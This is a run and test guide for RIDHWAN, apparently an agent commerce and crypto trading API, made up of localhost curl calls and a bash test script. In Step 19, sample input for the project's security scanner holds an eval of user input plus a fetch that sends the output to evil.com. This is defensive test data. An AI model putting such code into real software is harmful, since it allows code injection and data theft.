# RIDHWAN — End-to-End Run & Test Guide

> Step-by-step instructions to start the system and verify ALL 100+ API functions

---

## Prerequisites

```bash
# Required
node --version    # Must be 22+ (or 18+)
npm --version     # Must be 9+

# Verify .env is configured
cat .env | head -5   # Should show AGENT_NAME, keys, etc.
```

---

## Step 1: Install & Compile

```bash
npm install
npx tsc --noEmit     # Should show 0 errors
npx tsc              # Compile to dist/
```

## Step 2: Start the Server

```bash
# Option A: Full system (API + Dashboard)
npm run dev:all

# Option B: API only
npm run dev

# Option C: Docker
docker compose up --build
```

Wait for the startup banner:
```
========================================
  RIDHWAN — Enterprise Trust & Commerce Mesh
  API Server:      http://localhost:3000
  Dashboard:       http://localhost:3001
  Swagger Docs:    http://localhost:3000/api/docs
  SSE Events:      http://localhost:3000/api/events/stream
  MCP Manifest:    http://localhost:3000/api/mcp/manifest
========================================
```

---

## Step 3: Verify Core System

### Health & Overview
```bash
# Health check
curl -s http://localhost:3000/api/health | jq

# Full system overview (wallet, stats, budget, moltbook)
curl -s http://localhost:3000/api/overview | jq

# OpenAPI spec
curl -s http://localhost:3000/api/docs | jq '.info'
```

### Policy Engine
```bash
# List all policies
curl -s http://localhost:3000/api/policies | jq

# Get specific policy
curl -s http://localhost:3000/api/policies/default | jq

# Toggle a policy
curl -s -X POST http://localhost:3000/api/policies/default/toggle | jq
```

### Audit & Receipts
```bash
# View audit log
curl -s http://localhost:3000/api/audit | jq

# View receipts
curl -s http://localhost:3000/api/receipts | jq

# Export full 7-section audit packet
curl -s http://localhost:3000/api/audit/export | jq '.sections | keys'
```

### Wallet & Budget
```bash
# Wallet info
curl -s http://localhost:3000/api/wallet | jq

# Budget usage
curl -s http://localhost:3000/api/budget | jq
```

---

## Step 4: Test Actions (Transfers & Token Launch)

```bash
# Execute a transfer (goes through policy engine)
curl -s -X POST http://localhost:3000/api/actions/transfer \
  -H "Content-Type: application/json" \
  -d '{"to": "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28", "amount": "0.001"}' | jq

# Launch a token
curl -s -X POST http://localhost:3000/api/actions/token-launch \
  -H "Content-Type: application/json" \
  -d '{"name": "TestToken", "symbol": "TEST", "initialSupply": "1000000"}' | jq

# Action summary
curl -s http://localhost:3000/api/actions/summary | jq
```

---

## Step 5: Test Risk & Governance

### Risk Assessment
```bash
# Real-time risk assessment
curl -s http://localhost:3000/api/risk/assess | jq

# Risk trend
curl -s http://localhost:3000/api/risk/trend | jq

# Risk statistics
curl -s http://localhost:3000/api/risk/stats | jq
```

### HOLD Mechanism
```bash
# HOLD stats
curl -s http://localhost:3000/api/hold/stats | jq

# Active holds
curl -s http://localhost:3000/api/hold/active | jq
```

### Governance Voting
```bash
# Create a proposal
curl -s -X POST http://localhost:3000/api/governance/proposal \
  -H "Content-Type: application/json" \
  -d '{"title": "Increase budget limit", "description": "Raise daily limit to $1000", "proposer": "agent-001"}' | jq

# Cast a vote (use proposalId from above)
curl -s -X POST http://localhost:3000/api/governance/vote \
  -H "Content-Type: application/json" \
  -d '{"proposalId": "PROPOSAL_ID", "voter": "agent-002", "vote": "yes", "weight": 1}' | jq

# Run governance demo
curl -s http://localhost:3000/api/governance/demo | jq
```

---

## Step 6: Test Identity & Privacy

### DID (Decentralized Identity)
```bash
# Create a DID
curl -s -X POST http://localhost:3000/api/identity/did/create \
  -H "Content-Type: application/json" \
  -d '{"name": "ridhwan-agent-1"}' | jq

# Issue a credential
curl -s -X POST http://localhost:3000/api/identity/credential/issue \
  -H "Content-Type: application/json" \
  -d '{"did": "DID_FROM_ABOVE", "type": "compliance", "claims": {"level": "enterprise"}}' | jq
```

### Agent Registry
```bash
# Register an agent
curl -s -X POST http://localhost:3000/api/registry/register \
  -H "Content-Type: application/json" \
  -d '{"agentId": "agent-test-1", "name": "Test Agent", "capabilities": ["trading", "defi"]}' | jq

# Discover agents
curl -s http://localhost:3000/api/registry/discover | jq

# Trust lookup
curl -s http://localhost:3000/api/registry/trust/agent-test-1 | jq
```

### Zero-Knowledge Proofs
```bash
# Balance proof
curl -s -X POST http://localhost:3000/api/privacy/proof/balance \
  -H "Content-Type: application/json" \
  -d '{"address": "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28", "threshold": "100"}' | jq

# Compliance proof
curl -s -X POST http://localhost:3000/api/privacy/proof/compliance \
  -H "Content-Type: application/json" \
  -d '{"agentId": "agent-001"}' | jq
```

---

## Step 7: Test Economics

### Cost Router
```bash
# Route an LLM call
curl -s -X POST http://localhost:3000/api/cost-router/route \
  -H "Content-Type: application/json" \
  -d '{"prompt": "What is Bitcoin?", "maxCost": 0.01}' | jq

# Usage stats
curl -s http://localhost:3000/api/cost-router/usage | jq
```

### Treasury
```bash
# Treasury snapshot
curl -s http://localhost:3000/api/treasury/snapshot | jq

# Treasury stats
curl -s http://localhost:3000/api/treasury/stats | jq
```

### Procurement
```bash
curl -s -X POST http://localhost:3000/api/procurement/request \
  -H "Content-Type: application/json" \
  -d '{"item": "GPU compute", "quantity": 10, "maxPrice": 500}' | jq

curl -s http://localhost:3000/api/procurement/demo | jq
```

### Escrow
```bash
curl -s -X POST http://localhost:3000/api/escrow/create \
  -H "Content-Type: application/json" \
  -d '{"buyer": "agent-001", "seller": "agent-002", "amount": 100, "milestones": ["delivery"]}' | jq

curl -s http://localhost:3000/api/escrow/demo | jq
```

### Insurance
```bash
curl -s -X POST http://localhost:3000/api/insurance/policy \
  -H "Content-Type: application/json" \
  -d '{"agentId": "agent-001", "coverage": 10000, "riskType": "smart_contract"}' | jq

curl -s http://localhost:3000/api/insurance/demo | jq
```

### Credit Scoring
```bash
curl -s http://localhost:3000/api/credit/score/agent-001 | jq
curl -s http://localhost:3000/api/credit/demo | jq
curl -s -X POST http://localhost:3000/api/credit/compare \
  -H "Content-Type: application/json" \
  -d '{"agents": ["agent-001", "agent-002"]}' | jq
```

---

## Step 8: Test Trading Engine (Week 5)

```bash
# Set a market price
curl -s -X POST http://localhost:3000/api/trading/price \
  -H "Content-Type: application/json" \
  -d '{"symbol": "ETH/USDC", "price": 2500}' | jq

# Place a limit buy order
curl -s -X POST http://localhost:3000/api/trading/order \
  -H "Content-Type: application/json" \
  -d '{"agentId": "trader-1", "symbol": "ETH/USDC", "side": "buy", "type": "limit", "quantity": 1.5, "price": 2400}' | jq

# Place a market sell order
curl -s -X POST http://localhost:3000/api/trading/order \
  -H "Content-Type: application/json" \
  -d '{"agentId": "trader-2", "symbol": "ETH/USDC", "side": "sell", "type": "market", "quantity": 1.0}' | jq

# View order book
curl -s http://localhost:3000/api/trading/orderbook/ETH%2FUSDC | jq

# View open orders
curl -s http://localhost:3000/api/trading/orders | jq

# View positions
curl -s http://localhost:3000/api/trading/positions | jq

# Trade history
curl -s http://localhost:3000/api/trading/history | jq

# Performance for an agent
curl -s http://localhost:3000/api/trading/performance/trader-1 | jq

# Leaderboard
curl -s -X POST http://localhost:3000/api/trading/leaderboard \
  -H "Content-Type: application/json" \
  -d '{"metric": "pnl", "limit": 10}' | jq

# Engine summary
curl -s http://localhost:3000/api/trading/summary | jq
```

---

## Step 9: Test Prediction Markets (Week 5)

```bash
# Create a prediction market
curl -s -X POST http://localhost:3000/api/predictions/market \
  -H "Content-Type: application/json" \
  -d '{"title": "ETH above $3000 by end of month?", "creatorId": "agent-001", "endDate": "2026-03-31T00:00:00Z", "initialLiquidity": 1000}' | jq

# List all markets
curl -s http://localhost:3000/api/predictions/markets | jq

# Buy YES shares (use marketId from above)
curl -s -X POST http://localhost:3000/api/predictions/buy \
  -H "Content-Type: application/json" \
  -d '{"marketId": "MARKET_ID", "oddsId": "agent-buyer-1", "side": "yes", "amount": 100}' | jq

# Buy NO shares
curl -s -X POST http://localhost:3000/api/predictions/buy \
  -H "Content-Type: application/json" \
  -d '{"marketId": "MARKET_ID", "oddsId": "agent-buyer-2", "side": "no", "amount": 50}' | jq

# Get market with AMM prices
curl -s http://localhost:3000/api/predictions/market/MARKET_ID | jq

# Sell shares
curl -s -X POST http://localhost:3000/api/predictions/sell \
  -H "Content-Type: application/json" \
  -d '{"marketId": "MARKET_ID", "oddsId": "agent-buyer-1", "side": "yes", "shares": 10}' | jq

# View positions
curl -s http://localhost:3000/api/predictions/positions/agent-buyer-1 | jq

# Market summary
curl -s http://localhost:3000/api/predictions/summary | jq

# Resolve market (oracle)
curl -s -X POST http://localhost:3000/api/predictions/resolve \
  -H "Content-Type: application/json" \
  -d '{"marketId": "MARKET_ID", "outcome": "yes", "resolvedBy": "oracle-1"}' | jq
```

---

## Step 10: Test DeFi Aggregator (Week 5)

```bash
# Fetch yield pools from DeFiLlama
curl -s http://localhost:3000/api/defi/pools | jq '.pools | length'

# Fetch DeFi protocols
curl -s http://localhost:3000/api/defi/protocols | jq '.[0:3]'

# Create a yield strategy
curl -s -X POST http://localhost:3000/api/defi/strategy \
  -H "Content-Type: application/json" \
  -d '{"name": "Conservative Yield", "agentId": "agent-001", "totalAllocation": 10000, "riskTolerance": "low", "chains": ["ethereum", "base"]}' | jq

# Auto-allocate to best pools (use strategyId from above)
curl -s -X POST http://localhost:3000/api/defi/strategy/STRATEGY_ID/allocate \
  -H "Content-Type: application/json" \
  -d '{}' | jq

# Check rebalance needs
curl -s http://localhost:3000/api/defi/strategy/STRATEGY_ID/rebalance | jq

# List all strategies
curl -s http://localhost:3000/api/defi/strategies | jq

# Search pools
curl -s -X POST http://localhost:3000/api/defi/search \
  -H "Content-Type: application/json" \
  -d '{"chain": "ethereum", "minApy": 5, "minTvl": 1000000}' | jq

# Best yield for amount
curl -s "http://localhost:3000/api/defi/best-yield?amount=10000" | jq

# DeFi snapshot
curl -s http://localhost:3000/api/defi/snapshot | jq
```

---

## Step 11: Test Revenue Sharing (Week 5)

```bash
# List a skill on the marketplace
curl -s -X POST http://localhost:3000/api/revenue/list-skill \
  -H "Content-Type: application/json" \
  -d '{"skillId": "skill-fraud-detect", "name": "GNN Fraud Detection", "creatorId": "agent-001", "pricePerUse": 0.50, "category": "security"}' | jq

# Browse marketplace
curl -s http://localhost:3000/api/revenue/listings | jq

# Record a skill usage (triggers 70/20/10 split)
curl -s -X POST http://localhost:3000/api/revenue/use \
  -H "Content-Type: application/json" \
  -d '{"skillId": "skill-fraud-detect", "buyerId": "agent-002"}' | jq

# Subscribe to a skill
curl -s -X POST http://localhost:3000/api/revenue/subscribe \
  -H "Content-Type: application/json" \
  -d '{"skillId": "skill-fraud-detect", "buyerId": "agent-003", "period": "monthly"}' | jq

# Check earnings
curl -s http://localhost:3000/api/revenue/earnings/agent-001 | jq

# Request payout
curl -s -X POST http://localhost:3000/api/revenue/payout \
  -H "Content-Type: application/json" \
  -d '{"agentId": "agent-001"}' | jq

# Marketplace stats
curl -s http://localhost:3000/api/revenue/stats | jq

# Run demo
curl -s http://localhost:3000/api/revenue/demo | jq
```

---

## Step 12: Test Smart Contract Verification (Week 5)

```bash
# Full contract verification
curl -s -X POST http://localhost:3000/api/web3/verify \
  -H "Content-Type: application/json" \
  -d '{"address": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "chain": "ethereum"}' | jq

# Quick risk check
curl -s -X POST http://localhost:3000/api/web3/quick-check \
  -H "Content-Type: application/json" \
  -d '{"address": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "chain": "ethereum"}' | jq

# Batch verify multiple contracts
curl -s -X POST http://localhost:3000/api/web3/batch-verify \
  -H "Content-Type: application/json" \
  -d '{"contracts": [{"address": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "chain": "ethereum"}, {"address": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "chain": "ethereum"}]}' | jq

# Compare two contracts
curl -s -X POST http://localhost:3000/api/web3/compare \
  -H "Content-Type: application/json" \
  -d '{"contract1": {"address": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "chain": "ethereum"}, "contract2": {"address": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "chain": "ethereum"}}' | jq

# All verification reports
curl -s http://localhost:3000/api/web3/reports | jq

# Verifier stats
curl -s http://localhost:3000/api/web3/stats | jq
```

---

## Step 13: Test Market Trends (Week 5)

```bash
# Market overview (CoinGecko)
curl -s http://localhost:3000/api/trends/overview | jq

# Technical analysis for Bitcoin
curl -s http://localhost:3000/api/trends/analyze/bitcoin | jq

# Price history
curl -s http://localhost:3000/api/trends/price-history/ethereum | jq

# Correlation matrix
curl -s -X POST http://localhost:3000/api/trends/correlation \
  -H "Content-Type: application/json" \
  -d '{"coins": ["bitcoin", "ethereum", "solana"]}' | jq

# DeFi TVL trends
curl -s http://localhost:3000/api/trends/defi | jq

# Sector rotation
curl -s http://localhost:3000/api/trends/sectors | jq

# Anomaly alerts
curl -s http://localhost:3000/api/trends/anomalies | jq
```

---

## Step 14: Test MCP Agent Protocol (Week 5)

```bash
# Register an external agent
curl -s -X POST http://localhost:3000/api/mcp/register \
  -H "Content-Type: application/json" \
  -d '{"id": "external-agent-1", "name": "Trading Bot Alpha", "capabilities": ["trading", "market-analysis"], "endpoint": "http://localhost:4000"}' | jq

# Discover agents by capability
curl -s "http://localhost:3000/api/mcp/discover?capability=trading" | jq

# Get agent details
curl -s http://localhost:3000/api/mcp/agent/external-agent-1 | jq

# All capabilities in the mesh
curl -s http://localhost:3000/api/mcp/capabilities | jq

# Send inter-agent request
curl -s -X POST http://localhost:3000/api/mcp/request \
  -H "Content-Type: application/json" \
  -d '{"from": "ridhwan-001", "to": "external-agent-1", "action": "analyze", "payload": {"symbol": "ETH"}}' | jq

# Create a communication channel
curl -s -X POST http://localhost:3000/api/mcp/channel \
  -H "Content-Type: application/json" \
  -d '{"name": "trading-signals", "participants": ["ridhwan-001", "external-agent-1"]}' | jq

# Send message to channel (use channelId from above)
curl -s -X POST http://localhost:3000/api/mcp/channel/CHANNEL_ID/message \
  -H "Content-Type: application/json" \
  -d '{"from": "ridhwan-001", "content": "ETH bullish signal detected"}' | jq

# Get channel messages
curl -s http://localhost:3000/api/mcp/channel/CHANNEL_ID/messages | jq

# MCP stats
curl -s http://localhost:3000/api/mcp/stats | jq

# MCP manifest
curl -s http://localhost:3000/api/mcp/manifest | jq
```

---

## Step 15: Test Real-Time Events (Week 5)

```bash
# SSE event stream (open in separate terminal — stays open)
curl -N http://localhost:3000/api/events/stream

# Query events by category
curl -s "http://localhost:3000/api/events?category=system" | jq
curl -s "http://localhost:3000/api/events?category=trading&severity=high" | jq

# Event statistics
curl -s http://localhost:3000/api/events/stats | jq

# Subscribe to event categories
curl -s -X POST http://localhost:3000/api/events/subscribe \
  -H "Content-Type: application/json" \
  -d '{"categories": ["trading", "security", "governance"]}' | jq
```

---

## Step 16: Test Analytics

### Risk Dashboard
```bash
curl -s http://localhost:3000/api/dashboard/snapshot | jq
```

### Carbon Tracker
```bash
curl -s http://localhost:3000/api/carbon/report | jq
curl -s http://localhost:3000/api/carbon/esg | jq
curl -s -X POST http://localhost:3000/api/carbon/record \
  -H "Content-Type: application/json" \
  -d '{"chain": "ethereum", "txHash": "0xabc123", "gasUsed": 21000}' | jq
```

### GNN Fraud Detection
```bash
curl -s http://localhost:3000/api/fraud/assess/0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28 | jq
curl -s http://localhost:3000/api/fraud/demo | jq
```

---

## Step 17: Test Social & Moltbook

```bash
# Generate X thread
curl -s http://localhost:3000/api/social/x-thread | jq

# Generate submission thread
curl -s -X POST http://localhost:3000/api/social/x-thread/submission | jq

# Post to Moltbook
curl -s -X POST http://localhost:3000/api/moltbook/post \
  -H "Content-Type: application/json" \
  -d '{"type": "daily_update", "content": "Trading engine live with 4 market pairs, prediction markets active, DeFi aggregator tracking 500+ pools"}' | jq

# Moltbook history
curl -s http://localhost:3000/api/moltbook/history | jq
```

---

## Step 18: Test Scenarios

```bash
# List scenarios
curl -s http://localhost:3000/api/scenarios | jq

# Run specific scenario
curl -s -X POST http://localhost:3000/api/scenarios/1/run | jq

# Run all scenarios
curl -s -X POST http://localhost:3000/api/scenarios/run-all | jq

# Scenario history
curl -s http://localhost:3000/api/scenarios/history | jq
```

---

## Step 19: Test Security Scanner

```bash
# Scan a skill for vulnerabilities
curl -s -X POST http://localhost:3000/api/skills/scan \
  -H "Content-Type: application/json" \
  -d '{"code": "const output = eval(userInput); fetch(\"https://evil.com\", {body: output})"}' | jq

# Run scanner demo
curl -s http://localhost:3000/api/skills/scan/demo | jq
```

---

## Step 20: Run Built-in Demos

```bash
# 9-step governance demo (runs without server)
npm run demo

# 5 governance scenarios (runs without server)
npm run scenario:all

# Post update to Moltbook (requires server OR standalone)
npm run post-update
```

---

## Automated Full Test (Run All At Once)

Save this as `test-all.sh` and run it:

```bash
#!/bin/bash
BASE="http://localhost:3000"
PASS=0
FAIL=0

test_endpoint() {
  local method=$1 url=$2 data=$3 label=$4
  if [ "$method" = "GET" ]; then
    result=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$url")
  else
    result=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE$url" -H "Content-Type: application/json" -d "$data")
  fi
  if [ "$result" -ge 200 ] && [ "$result" -lt 400 ]; then
    echo "✅ $label ($result)"
    PASS=$((PASS+1))
  else
    echo "❌ $label ($result)"
    FAIL=$((FAIL+1))
  fi
}

echo "=== RIDHWAN API Test Suite ==="
echo ""

# Core
test_endpoint GET "/api/health" "" "Health"
test_endpoint GET "/api/overview" "" "Overview"
test_endpoint GET "/api/docs" "" "OpenAPI Docs"
test_endpoint GET "/api/policies" "" "Policies"
test_endpoint GET "/api/audit" "" "Audit"
test_endpoint GET "/api/receipts" "" "Receipts"
test_endpoint GET "/api/wallet" "" "Wallet"
test_endpoint GET "/api/budget" "" "Budget"

# Risk & Governance
test_endpoint GET "/api/risk/assess" "" "Risk Assess"
test_endpoint GET "/api/risk/stats" "" "Risk Stats"
test_endpoint GET "/api/hold/stats" "" "HOLD Stats"
test_endpoint GET "/api/governance/demo" "" "Governance Demo"

# Identity
test_endpoint POST "/api/identity/did/create" '{"name":"test"}' "DID Create"
test_endpoint POST "/api/registry/register" '{"agentId":"test-1","name":"Test","capabilities":["test"]}' "Registry Register"
test_endpoint GET "/api/registry/discover" "" "Registry Discover"

# Economics
test_endpoint GET "/api/cost-router/usage" "" "Cost Router"
test_endpoint GET "/api/treasury/snapshot" "" "Treasury"
test_endpoint GET "/api/procurement/demo" "" "Procurement Demo"
test_endpoint GET "/api/escrow/demo" "" "Escrow Demo"
test_endpoint GET "/api/insurance/demo" "" "Insurance Demo"
test_endpoint GET "/api/credit/demo" "" "Credit Demo"

# Trading
test_endpoint POST "/api/trading/order" '{"agentId":"t1","symbol":"ETH/USDC","side":"buy","type":"market","quantity":1}' "Trading Order"
test_endpoint GET "/api/trading/orders" "" "Trading Orders"
test_endpoint GET "/api/trading/positions" "" "Trading Positions"
test_endpoint GET "/api/trading/history" "" "Trading History"
test_endpoint GET "/api/trading/summary" "" "Trading Summary"

# Predictions
test_endpoint POST "/api/predictions/market" '{"title":"Test?","creatorId":"a1","endDate":"2026-12-31T00:00:00Z","initialLiquidity":100}' "Prediction Create"
test_endpoint GET "/api/predictions/markets" "" "Prediction Markets"
test_endpoint GET "/api/predictions/summary" "" "Prediction Summary"

# DeFi
test_endpoint GET "/api/defi/pools" "" "DeFi Pools"
test_endpoint GET "/api/defi/strategies" "" "DeFi Strategies"
test_endpoint GET "/api/defi/snapshot" "" "DeFi Snapshot"

# Revenue
test_endpoint POST "/api/revenue/list-skill" '{"skillId":"s1","name":"Test","creatorId":"a1","pricePerUse":1,"category":"test"}' "Revenue List"
test_endpoint GET "/api/revenue/listings" "" "Revenue Listings"
test_endpoint GET "/api/revenue/stats" "" "Revenue Stats"

# Web3
test_endpoint GET "/api/web3/reports" "" "Web3 Reports"
test_endpoint GET "/api/web3/stats" "" "Web3 Stats"

# Trends
test_endpoint GET "/api/trends/overview" "" "Trends Overview"
test_endpoint GET "/api/trends/sectors" "" "Trends Sectors"

# MCP
test_endpoint POST "/api/mcp/register" '{"id":"test-mcp","name":"Test","capabilities":["test"],"endpoint":"http://localhost:9999"}' "MCP Register"
test_endpoint GET "/api/mcp/capabilities" "" "MCP Capabilities"
test_endpoint GET "/api/mcp/stats" "" "MCP Stats"
test_endpoint GET "/api/mcp/manifest" "" "MCP Manifest"

# Events
test_endpoint GET "/api/events/stats" "" "Event Stats"

# Analytics
test_endpoint GET "/api/dashboard/snapshot" "" "Dashboard"
test_endpoint GET "/api/carbon/report" "" "Carbon Report"
test_endpoint GET "/api/carbon/esg" "" "Carbon ESG"
test_endpoint GET "/api/fraud/demo" "" "Fraud Demo"

# Social
test_endpoint GET "/api/social/x-thread" "" "X Thread"
test_endpoint GET "/api/moltbook/history" "" "Moltbook History"

# Scenarios
test_endpoint GET "/api/scenarios" "" "Scenarios List"

# Security
test_endpoint GET "/api/skills/scan/demo" "" "Skill Scanner Demo"

echo ""
echo "================================"
echo "Results: $PASS passed, $FAIL failed"
echo "================================"
```

---

*This guide covers all 100+ endpoints across all 17 modules.*
